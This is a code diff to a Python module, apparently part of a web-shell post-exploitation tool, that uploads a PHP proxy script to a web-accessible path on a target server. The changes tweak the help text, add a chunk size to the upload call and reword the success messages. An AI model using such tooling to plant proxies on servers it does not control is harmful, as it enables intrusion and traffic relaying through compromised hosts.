@@ -20,7 +20,7 @@ classname = 'PhpProxy'
     
 class PhpProxy(Module):
 
-    params = ParametersList('Install PHP proxy (needs remote php-curl)', [],
+    params = ParametersList('Install PHP proxy to target', [],
                     P(arg='rpath', help='Upload proxy script to web accessible path (ends with \'.php\')'),
                     P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
                     )
@@ -40,7 +40,7 @@ class PhpProxy(Module):
     def __upload_file_content(self, content, rpath):
         self.modhandler.load('file.upload').set_file_content(content)
         self.modhandler.set_verbosity(6)
-        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath })
+        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath, 'chunksize' : 512 })
         self.modhandler.set_verbosity()
         
         return response
@@ -85,11 +85,12 @@ class PhpProxy(Module):
         
             if response:
                 
-                output_url = ''
                 if url:
-                    output_url = ' with address \'%s\'' % url
+                    self.mprint('[%s] PHP proxy script uploaded. Go with your browser to %s?u=http://www.google.com\'' % (self.name, url))
+                else:
+                    self.mprint('[%s] PHP proxy script uploaded. Go with your browser to script URL followed by ?u=http://www.google.com\'' % (self.name))
                 
-                self.mprint('[%s] PHP proxy uploaded%s, browse it with parameter \'?u=http://www.google.com\'' % (self.name, output_url))
+                
                 return 
             
         raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
